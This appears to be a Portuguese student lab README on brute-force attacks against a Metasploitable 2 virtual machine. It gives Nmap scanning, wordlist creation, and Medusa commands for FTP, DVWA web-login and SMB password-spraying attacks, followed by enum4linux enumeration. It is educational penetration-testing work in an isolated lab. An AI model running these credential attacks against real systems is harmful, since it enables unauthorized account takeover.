# ciber-santander-brute-force-
Projeto de Cibersegurança: 

   Ataques de Força Bruta

Compreender a vulnerabilidade de diferentes serviços (FTP, Web, SMB) a ataques de força bruta.
Utilização do Kali Linux e da ferramenta Medusa para testes de penetração.

Sistema Operacional	Kali Linux	Máquina atacante, Alvo Vulnerável	Metasploitable 2.
Ataque	Medusa	Ferramenta de força bruta para serviços de rede.
Reconhecimento	Nmap	Escaneamento de portas e serviços.

Configuração do Ambiente
O ambiente foi configurado com duas Máquinas Virtuais no VirtualBox.

Kali Linux	192.168.15.80	
Metasploitable 2	192.168.15.87

Ataque

 1	FTP (File Transfer Protocol)	Medusa	Força bruta tradicional (usuário fixo, múltiplas senhas).
 2	Formulário Web (DVWA)	Medusa/Hydra	Automação de tentativas de login via HTTP POST.
 3	SMB (Server Message Block)	Medusa	Password Spraying (múltiplos usuários, senha única).
 1 (FTP)
1- Localizando portas abertas na  rede.
nmap -sV -p 21,22,80,445,139   192.168.15.87

2- Validando possibilidade de acesso via FTP.
ftp 192.168.15.87

3- Criando wordlists para o brute force.
echo -e 'user\nmsfadmin\nadmin\nroot' > usuarios.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > senhas.txt

4- Executando o ataque de brute force com o Medusa.
medusa -h 192.168.15.87 -U usuarios.txt -P senhas.txt -M ftp -t 6

5- Validando usuario e senha localizado no FTP.
ftp 192.168.15.87

6- Localizando parâmetros de acesso DVWA
Acesso site e localizando parâmetros via inspeção WEB

7- Criando wordlists para o brute force DVWA.
echo -e 'user\nmsfadmin\nadmin\nroot' > usuariosdvwa.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > senhasdvwa.txt

8- Executando brute force no formulario de login.
medusa -h 192.168.15.87 -U usuariosdvwa.txt -P senhasdvwa.txt -M http
-m PAGE:'/dvwa/login.php'
-m FORM:'username=^USER^&password=^PASS^&Login=login'
-m 'FAIL=Login failed' -t 6

9- Validando credenciais localizadas
Realizando o login no formulado da pagina DVWA.

10- Enumeração de usuários.
enum4linux -a 192.168.15.87 | tee enu4m_output.txt

11- Criando wordlists para o SMB.
echo -e 'user\nmsfadmin\nadmin\nroot' > smb_usuarios.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > senhas_spray.txt

12- Executando ataque de password Spray
medusa -h 192.168.15.87 -U smb_usuarios.txt -P senhas_spray.txt -M smbnt -t 2 -T 50

13- Validação de credenciais localizadas. smbclient -L //192.168.15.87 -U msfadmin
